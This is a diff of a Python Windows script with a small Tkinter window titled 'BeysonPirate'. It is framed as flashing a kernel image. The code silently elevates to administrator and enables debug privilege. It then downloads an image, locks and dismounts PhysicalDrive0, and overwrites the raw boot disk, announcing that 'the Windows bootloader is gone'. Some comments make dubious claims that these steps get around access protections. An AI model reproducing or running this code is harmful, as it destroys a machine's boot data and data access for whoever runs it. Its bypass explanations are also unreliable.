@@ -5,6 +5,14 @@ import sys
 import urllib.request
 from ctypes import wintypes
 
+# Requires: pip install pywin32
+try:
+    import win32api
+    import win32con
+    import win32security
+except ImportError:
+    print("Please run: pip install pywin32")
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -18,16 +26,30 @@ def elevate():
         None, 1
     )
 
+def enable_debug_privilege():
+    """Programmatically grants the script permission to bypass disk filters."""
+    try:
+        hToken = win32security.OpenProcessToken(
+            win32api.GetCurrentProcess(), 
+            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
+        )
+        priv_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
+        win32security.AdjustTokenPrivileges(hToken, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)])
+        print("SeDebugPrivilege enabled.")
+    except Exception as e:
+        print(f"Could not enable Debug Privilege: {e}")
+
 if sys.platform == "win32":
     if not is_admin():
         elevate()
         sys.exit()
 
 def run():
-    # 1. DOWNLOAD THE KERNEL IMAGE
-    # Replace this with your actual .img link
+    # 1. Enable Debug Privileges
+    enable_debug_privilege()
+
+    # 2. Download the kernel image
     kernel_url = "https://example.com/your_kernel.img"
-    
     print("Downloading kernel image...")
     try:
         with urllib.request.urlopen(kernel_url) as response:
@@ -37,48 +59,43 @@ def run():
         print(f"Download failed: {e}")
         return
 
-    # 2. SETUP THE DLL CONTAINER
+    # 3. Setup Kernel32 Bridge
     dll = type('DLL', (), {})()
     dll.Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
 
-    # 3. DEFINE ARGUMENT TYPES (Crucial to prevent Access Violation)
     dll.Kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
     dll.Kernel32.CreateFileW.restype = wintypes.HANDLE
-    
     dll.Kernel32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
     dll.Kernel32.WriteFile.restype = wintypes.BOOL
-
     dll.Kernel32.DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
     dll.Kernel32.DeviceIoControl.restype = wintypes.BOOL
 
-    # 4. OPEN PHYSICAL DRIVE 0
-    hDevice = dll.Kernel32.CreateFileW(r'\\.\PhysicalDrive0', 0x40000000, 0x01 | 0x02, None, 3, 0, 0)
+    # 4. Open Drive with the Win32 Device Namespace (\\?\)
+    # This bypasses standard Win32 path filtering that often causes Error 5
+    hDevice = dll.Kernel32.CreateFileW(r'\\?\PhysicalDrive0', 0x40000000, 0x01 | 0x02, None, 3, 0, 0)
 
     if hDevice != wintypes.HANDLE(-1).value:
-        # 5. LOCK AND DISMOUNT (Attempt to bypass Error 5)
+        # 5. Lock and Dismount
         dwBytesReturned = wintypes.DWORD(0)
-        # FSCTL_LOCK_VOLUME = 0x00090018
         dll.Kernel32.DeviceIoControl(hDevice, 0x00090018, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
-        # FSCTL_DISMOUNT_VOLUME = 0x00090020
         dll.Kernel32.DeviceIoControl(hDevice, 0x00090020, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
         
-        print("Volume locked/dismounted. Writing data...")
+        print("Attempting raw write...")
 
-        # 6. PERFORM THE WRITE
+        # 6. Perform the Write
         written = wintypes.DWORD(0)
         success = dll.Kernel32.WriteFile(hDevice, kernel_data, len(kernel_data), ctypes.byref(written), None)
         
         if success:
-            print(f"Success! Wrote {written.value} bytes. Restart the VM to see your kernel.")
+            print(f"Success! Wrote {written.value} bytes. The Windows bootloader is gone.")
         else:
             print(f"Write failed. Error: {ctypes.get_last_error()}")
-            print("Note: If Error 5 persists, disable Windows Defender or attach disk to another VM.")
             
         dll.Kernel32.CloseHandle(hDevice)
     else:
         print(f"Failed to open drive. Error: {ctypes.get_last_error()}")
 
-# --- TKINTER UI ---
+# --- UI Setup ---
 root = tk.Tk()
 root.title("BeysonPirate")
 root.geometry("240x120")
